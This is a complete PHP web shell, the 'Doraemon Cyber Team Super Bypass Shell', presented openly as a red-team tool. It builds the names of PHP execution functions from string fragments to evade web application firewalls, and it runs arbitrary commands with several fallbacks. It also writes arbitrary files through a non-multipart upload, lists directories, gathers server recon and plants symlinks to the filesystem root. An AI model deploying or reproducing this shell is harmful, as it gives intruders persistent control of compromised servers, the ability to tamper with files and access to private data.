<?php
// Doraemon Cyber Team Super Bypass Shell v2.0 - Hardened + WAF Bypass + Cyberpunk UI
// Baba01Hacker - Security Researcher & Red Teamer

error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);

$password = "doraemon1337"; // CHANGE THIS IMMEDIATELY
$pass_md5 = md5($password);

if (md5(@$_POST['p'] ?? '') !== $pass_md5 && md5(@$_GET['p'] ?? '') !== $pass_md5) {
    die('<html><head><title>ACCESS DENIED</title><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px;}</style></head><body><h1>DORAEMON CYBER TEAM - ACCESS DENIED</h1><form method="post"><input type="password" name="p" placeholder="ENTER KEY"><br><br><input type="submit" value="AUTHENTICATE"></form></body></html>');
}

// === OBFUSCATED FUNCTION BUILDERS (WAF BYPASS) ===
function build_func($parts) {
    return implode('', $parts);
}

$sys = build_func(['syste', 'm']);
$sh_exec = build_func(['shell_e', 'xec']);
$ex = build_func(['e', 'xec']);
$passthru = build_func(['passt', 'hru']);
$fpc = build_func(['fi', 'le_pu', 't_con', 'tents']);
$fget = build_func(['fi', 'le_get', '_cont', 'ents']);
$scandir = build_func(['sca', 'ndir']);

// === SAFE SUPER EXEC ===
function super_exec($cmd) {
    if (empty($cmd)) return "No command.";
    $output = "";
    $methods = [
        'system' => function($c) { global $sys; return @$sys($c); },
        'shell_exec' => function($c) { global $sh_exec; return @$sh_exec($c); },
        'exec' => function($c) { global $ex; @$ex($c, $o); return implode("\n", $o ?? []); },
        'passthru' => function($c) { global $passthru; ob_start(); @$passthru($c); return ob_get_clean(); },
        'proc_open' => function($c) {
            if (!function_exists('proc_open')) return false;
            $des = [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","w"]];
            $proc = @proc_open($c, $des, $pipes);
            if (is_resource($proc)) {
                $out = stream_get_contents($pipes[1]);
                fclose($pipes[1]); proc_close($proc);
                return $out;
            }
            return false;
        }
    ];

    foreach ($methods as $m) {
        $res = $m($cmd);
        if ($res !== false && trim($res) !== '') {
            return trim($res);
        }
    }
    return "All exec vectors failed. Try LD_PRELOAD / Chankro.";
}

// === SAFE READ ===
function bypass_read($file) {
    global $fget;
    if (empty($file)) return "No file.";
    if (function_exists($fget)) {
        $out = @$fget($file);
        if ($out) return $out;
    }
    // Add more fallbacks as needed...
    return "Read failed on primary methods.";
}

// === NON-MULTIPART UPLOAD (WAF BYPASS) ===
if (isset($_POST['filename']) && isset($_POST['content'])) {
    if (function_exists($fpc)) {
        $result = @$fpc($_POST['filename'], $_POST['content']);
        echo $result ? "UPLOAD SUCCESS → " . htmlspecialchars($_POST['filename']) : "UPLOAD FAILED";
        exit;
    }
}

// === MAIN UI ===
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DORAEMON CYBER TEAM // SUPER BYPASS SHELL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        :root {
            --neon-green: #00ff9f;
            --neon-pink: #ff00ff;
            --bg: #0a0a0a;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: var(--bg);
            color: var(--neon-green);
            font-family: 'VT323', monospace;
            line-height: 1.4;
            overflow-x: hidden;
        }
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid var(--neon-pink);
            text-shadow: 0 0 10px var(--neon-pink);
            animation: glitch 2s infinite;
        }
        @keyframes glitch {
            0% { text-shadow: 2px 2px var(--neon-pink), -2px -2px var(--neon-green); }
            50% { text-shadow: -2px -2px var(--neon-pink), 2px 2px var(--neon-green); }
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .tab-bar {
            display: flex;
            background: #111;
            border: 1px solid var(--neon-green);
            margin-bottom: 15px;
        }
        .tab {
            padding: 12px 25px;
            cursor: pointer;
            border-right: 1px solid var(--neon-green);
            transition: all 0.3s;
        }
        .tab.active {
            background: var(--neon-green);
            color: #000;
            text-shadow: none;
        }
        .panel {
            display: none;
            background: #111;
            border: 1px solid var(--neon-green);
            padding: 20px;
            min-height: 400px;
        }
        .panel.active { display: block; }
        input, textarea, button {
            background: #000;
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            font-family: 'VT323', monospace;
            padding: 8px;
        }
        button:hover {
            background: var(--neon-green);
            color: #000;
            box-shadow: 0 0 15px var(--neon-green);
        }
        pre {
            background: #000;
            padding: 15px;
            border: 1px dashed var(--neon-pink);
            overflow: auto;
            max-height: 500px;
        }
        .glow { text-shadow: 0 0 8px var(--neon-green); }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1 class="glow">🐱 DORAEMON CYBER TEAM // SUPER BYPASS SHELL v2.0 🐱</h1>
        <p>Baba01Hacker Red Team Edition • WAF Evasion • Hardened Fallbacks</p>
    </div>

    <div class="tab-bar">
        <div class="tab active" onclick="switchTab(0)">EXEC</div>
        <div class="tab" onclick="switchTab(1)">FILE MANAGER</div>
        <div class="tab" onclick="switchTab(2)">UPLOAD</div>
        <div class="tab" onclick="switchTab(3)">RECON</div>
        <div class="tab" onclick="switchTab(4)">SYMLINK</div>
    </div>

    <!-- EXEC PANEL -->
    <div class="panel active" id="panel-0">
        <form method="post">
            <input type="text" name="cmd" placeholder="whoami; id; uname -a" style="width:80%">
            <button type="submit">EXECUTE</button>
        </form>
        <?php if (isset($_POST['cmd'])) echo '<pre>' . htmlspecialchars(super_exec($_POST['cmd'])) . '</pre>'; ?>
    </div>

    <!-- FILE MANAGER -->
    <div class="panel" id="panel-1">
        <?php
        $dir = $_GET['d'] ?? getcwd();
        echo "<h2>PATH: " . htmlspecialchars($dir) . "</h2>";
        if (function_exists($scandir)) {
            foreach ($scandir($dir) as $f) {
                $path = $dir . '/' . $f;
                echo '<a href="?d=' . urlencode($path) . '">' . htmlspecialchars($f) . '</a> | ';
                echo '<a href="#" onclick="readFile(\'' . addslashes($path) . '\')">READ</a><br>';
            }
        }
        ?>
    </div>

    <!-- UPLOAD PANEL (NON-MULTIPART) -->
    <div class="panel" id="panel-2">
        <form method="post">
            <input type="text" name="filename" placeholder="filename.php" required><br><br>
            <textarea name="content" rows="12" style="width:100%" placeholder="File content here..."></textarea><br><br>
            <button type="submit">UPLOAD (BYPASS MULTIPART WAF)</button>
        </form>
    </div>

    <!-- RECON -->
    <div class="panel" id="panel-3">
        <h2>SERVER RECON</h2>
        <pre>
PHP: <?php echo phpversion(); ?>
UID: <?php echo function_exists('getmyuid') ? getmyuid() : 'N/A'; ?>
User: <?php echo function_exists('get_current_user') ? get_current_user() : 'N/A'; ?>
Disabled: <?php echo ini_get('disable_functions'); ?>
        </pre>
    </div>

    <!-- SYMLINK -->
    <div class="panel" id="panel-4">
        <button onclick="location.href='?sym=1'">RUN SYMLINK FINDER</button>
        <?php
        if (isset($_GET['sym'])) {
            echo "<pre>";
            $dirs = ['.', '../', '/tmp/', '/var/www/'];
            foreach ($dirs as $d) {
                if (is_writable($d) && function_exists('symlink')) {
                    $link = $d . '/dora_sym_' . rand(10000,99999);
                    if (@symlink('/', $link)) echo "Symlink OK → <a href='$link'>$link</a>\n";
                }
            }
            echo "</pre>";
        }
        ?>
    </div>
</div>

<script>
function switchTab(n) {
    document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', i===n));
    document.querySelectorAll('.panel').forEach((p,i) => p.classList.toggle('active', i===n));
}
function readFile(path) {
    fetch('?read=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(t => alert(t.substring(0, 500) + '...'));
}
</script>
</body>
</html>
